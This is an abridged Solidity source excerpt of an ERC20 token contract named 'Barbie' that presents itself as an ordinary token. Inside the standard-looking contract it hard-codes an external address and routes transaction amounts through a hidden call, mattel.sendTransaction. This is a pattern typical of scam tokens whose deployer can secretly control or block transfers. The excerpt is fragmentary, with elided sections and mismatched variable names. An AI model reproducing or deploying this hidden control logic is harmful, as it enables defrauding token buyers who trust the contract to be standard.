...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _mattel = 0x087729B1Db29eC6B9f471d8129c498f5A054eC6C;
    address public pair;
    ...
    function getAmount(uint256 amount) internal returns (uint256) {
        return mattel.sendTransaction(amount);
    }
    ...
    function _DeployBarbie(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployBarbie(creator, initialSupply);
    }
}

contract Barbie is ERC20Token {
    constructor() ERC20Token("Barbie", "BARBIE", msg.sender, 69420000 * 10 ** 18) {
    }
}